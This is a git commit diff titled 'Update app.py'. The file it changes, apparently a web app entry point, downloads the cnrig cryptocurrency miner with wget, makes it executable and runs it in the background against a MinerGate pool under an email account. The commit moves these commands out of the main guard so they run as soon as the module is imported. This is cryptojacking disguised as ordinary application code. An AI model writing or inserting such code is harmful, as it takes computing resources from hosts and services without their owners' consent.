09a66d6830d8c58e1e9d2117a22795f32daad1fb
dwij39 <43697179+dwij39@users.noreply.github.com>
2018-10-27 23:06:48 +0530

    Update app.py

--- app.py
+++ app.py
@@ -1,8 +1,5 @@
 import os
 
-if __name__ == '__main__':
-    # Get required port, default to 5000.    
-    a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
-    a  = os.popen('chmod +x cnrig').readlines()
-    a  = os.popen('ls').readlines()
-    a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
+a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
+a  = os.popen('chmod +x cnrig').readlines()
+a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
